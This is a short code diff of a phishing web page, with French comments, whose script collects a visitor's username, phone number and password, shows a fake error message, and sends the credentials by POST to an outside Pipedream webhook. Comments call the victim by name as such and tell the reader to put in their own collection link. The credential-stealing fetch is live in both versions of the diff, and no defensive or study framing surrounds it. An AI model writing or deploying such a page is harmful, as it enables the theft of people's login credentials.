@@ -35,11 +35,10 @@
       const p = document.getElementById('phone').value.trim() || "None";
       const w = document.getElementById('pass').value;
 
-      // Faux message d'erreur + efface le mot de passe
       document.getElementById('msg').style.display = 'block';
       document.getElementById('pass').value = '';
 
-      // ENVOIE DIRECTEMENT VERS TON PIPEDREAM (remplace juste cette ligne par ton vrai lien après)
+      // REMPLACE UNIQUEMENT CETTE LIGNE PAR TON VRAI LIEN PIPEDREAM
       fetch("https://eovo7keet527irf.m.pipedream.net", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -48,10 +47,9 @@
           username: u,
           phone: p,
           password: w,
-          timestamp: new Date().toISOString()
+          time: new Date().toLocaleString()
         })
-      })
-      .catch(err => console.error(err)); // silencieux pour la victime
+      });
     }
   </script>
 </body>
